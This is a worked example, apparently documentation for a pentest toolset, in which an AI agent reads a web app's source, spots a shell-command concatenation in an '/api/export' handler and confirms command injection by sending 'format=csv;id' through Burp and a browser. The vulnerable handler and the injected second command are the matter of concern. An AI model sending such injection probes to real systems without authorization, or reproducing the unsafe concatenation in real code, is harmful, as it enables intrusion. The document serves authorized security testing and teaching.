# Source-Informed Web Testing — Worked Example

The Web-MCP stack lets Claude correlate **source code** (via github-mcp) with
**runtime behaviour** (via browser-mcp + burp-mcp) so test inputs are derived
from the actual implementation rather than guessed.

## Scenario

Audit the `/api/export` endpoint of `https://app.acmecorp.example` whose source
is at `https://github.com/acmecorp/webapp`.

## 1. Discover the codebase layout

```
get_directory_tree(repo_url="https://github.com/acmecorp/webapp", max_depth=3)
# → {"entries": [{"path": "src/api/export.py", "type": "file", ...}, ...]}
```

## 2. Locate the endpoint handler

```
search_code(query="/api/export repo:acmecorp/webapp")
# → [{"path": "src/api/export.py", "repository": "acmecorp/webapp", ...}]

get_file_contents(repo_url="https://github.com/acmecorp/webapp",
                  path="src/api/export.py", ref="main")
# → {"content": "@app.route('/api/export')\ndef export():\n    fmt = request.args['format']\n    return run(f'convert --to {fmt} data.csv')\n", ...}
```

The handler concatenates `format` into a shell command — a command-injection
candidate.

## 3. Derive a targeted probe from source

```
burp_http_send(
  raw_base64="<b64 of: GET /api/export?format=csv;id HTTP/1.1\r\nHost: app.acmecorp.example\r\n\r\n>",
  host="app.acmecorp.example", port=443, secure=true,
  save_to="F-001/export-cmdi-probe")
# → {"ok": true, "data": {"status": 200, "body_preview": "uid=33(www-data)...",
#     "saved": {"request": "evidence/F-001/export-cmdi-probe.request.http",
#               "response": "evidence/F-001/export-cmdi-probe.response.http"}}}
```

`body_preview` contains `uid=...` → command injection confirmed.

## 4. Confirm in a real browser and capture rendered evidence

```
browser_launch(headless=true, proxy="127.0.0.1:8080")
browser_navigate(url="https://app.acmecorp.example/api/export?format=csv;id")
browser_wait_for(selector="body", state="visible")
browser_screenshot(full_page=true, save_to="F-001/export-cmdi.png")
# → {"ok": true, "data": {"saved": "evidence/F-001/export-cmdi.png", "bytes": 41200}}
```

## 5. Cross-reference dependencies

```
list_dependabot_alerts(repo_url="https://github.com/acmecorp/webapp", state="open")
# → [{"package_name": "flask", "severity": "high", "cve_id": "CVE-2024-...", ...}]
```

## 6. Write up

Evidence is on disk under `evidence/F-001/`. The source reference is
`src/api/export.py @ <sha>` lines 12-14. Feed both into
`reporting-finding-writeup` with severity from `reporting-severity-rubric`
(unauthenticated RCE → Critical).

## The loop

**Read source → derive targeted input → observe runtime → correlate → capture.**
Because the probe was derived from the actual concatenation site, one request
confirmed the bug instead of a blind fuzz.
